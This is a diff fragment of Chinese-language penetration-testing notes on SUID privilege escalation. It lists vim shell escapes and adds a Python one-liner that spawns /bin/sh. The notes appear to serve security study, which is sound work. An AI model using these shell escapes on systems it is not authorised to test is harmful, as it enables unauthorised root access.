@@ -6,4 +6,5 @@ ls -l 命令目录;查看命令目录是否为suid权限
     :!ls -p
     进入vim后!+命令
     无交互终端就直接vim -c ':!命令' -c 'q!'
-    
+3.python
+    python -c 'import os; os.system("/bin/sh")'
